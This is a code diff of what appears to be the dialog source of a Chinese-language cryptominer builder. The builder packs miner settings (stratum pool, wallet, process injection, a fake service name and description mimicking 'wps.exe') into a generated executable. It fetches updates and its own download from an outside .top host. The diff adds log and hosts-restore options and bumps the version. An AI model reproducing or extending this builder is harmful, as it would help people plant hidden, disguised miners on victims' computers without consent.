@@ -19,7 +19,7 @@ static char THIS_FILE[] = __FILE__;
 
 	CString UpdateDate = "http://km.xn--pssa2683b.top/riqi.txt";  //挖矿程序更新日期
 
-	CString CurrentVersion = "2.4";//目前生成器版本
+	CString CurrentVersion = "2.6";//目前生成器版本
 	
 	CString downloadLink = "http://km.xn--pssa2683b.top/scq.exe";//生成器下载地址
 	
@@ -48,6 +48,8 @@ void CMyDlg::DoDataExchange(CDataExchange* pDX)
 	//{{AFX_DATA_MAP(CMyDlg)
 	
 	DDX_Check(pDX, IDC_UPX, UPX);
+	DDX_Check(pDX, IDC_log, log);
+	DDX_Check(pDX, IDC_hosts, hosts);
 	DDX_Text(pDX, IDC_SET_DIS, m_serdis);
 	DDX_Text(pDX, IDC_SET_DIS2, filename);
 	DDX_Text(pDX, IDC_EDIT6, wininj);
@@ -186,7 +188,7 @@ void CMyDlg::OnPaint()
 	Sleep(50);
 	if (IsFileExist("xxs.ini")==false)//判断文件是否存在
 	{
-		SetDlgItemText(IDC_SET_DIS," -B -o stratum+tcp://矿池地址 -u 钱包地址 -p x -k ");
+		SetDlgItemText(IDC_SET_DIS," -B -o stratum+tcp://矿池地址 -u 钱包地址 -p x -k --donate-level=5");
 		SetDlgItemText(IDC_SET_DIS2,"this");
 		SetDlgItemText(IDC_EDIT6,"0");//注入进程
 		SetDlgItemText(IDC_EDIT7,"0");//k服务
@@ -240,6 +242,8 @@ HCURSOR CMyDlg::OnQueryDragIcon()
 	char SerName[100];		//服务名称
 	char Serdisplay[128];	//显示名称
 	char Serdesc[256];		//服务描述
+	bool log;				//输出log
+	bool hosts;				//还原hosts
 }
 fallen_data =
 {
@@ -253,7 +257,9 @@ fallen_data =
 	"wps.exe",
 	"fuwmc",
 	"xiansmc",
-	"fuwumiaosu"
+	"fuwumiaosu",
+	false,
+	false,
 };
 
 //放到一起
@@ -276,7 +282,8 @@ void CMyDlg::build(CString file)
 	strcpy(fallen_data.SerName, m_svcname.GetBuffer(0));
 	strcpy(fallen_data.Serdisplay, m_scname.GetBuffer(0));
 	strcpy(fallen_data.Serdesc, m_shelp.GetBuffer(0));
-
+	fallen_data.hosts=hosts;
+	fallen_data.log=log;
 	char Path[MAX_PATH];
 	GetCurrentDirectory(MAX_PATH,Path);
 	strcat(Path,file1);
@@ -567,7 +574,7 @@ void CMyDlg::OnButton4()
 void CMyDlg::OnHelp() 
 {
 	// TODO: Add your control notification handler code here
-	MessageBox("linux(官方)：2.6.4内核，兼容性不错（基本全系统兼容）.\nlinux（兼容）：全系统兼容，内核版本2.6.0bate3. \narm（1）2.6.4最新内核,arm暂停使用.","提示"); 
+	MessageBox("linux：2.8.3内核，兼容性不错（基本全系统兼容）. \narm（1）2.6.4最新内核,arm暂停使用.","提示"); 
 }
 
 void CMyDlg::OnCancel2() 
@@ -579,9 +586,15 @@ void CMyDlg::OnCancel2()
 	bShow = !bShow;
 	
 	if	(bShow)
+	{
 		rct.right = rct.right + 300;
+		rct.bottom = rct.bottom + 120;
+	}
 	else
+	{
 		rct.right = rct.right - 300;
+		rct.bottom = rct.bottom - 120;
+	}
 	MoveWindow(&rct, TRUE);
 	InvalidateRect(NULL);
 	UpdateWindow();
@@ -592,3 +605,4 @@ void CMyDlg::OnRandom()
 	// TODO: Add your control notification handler code here
 	
 }
+
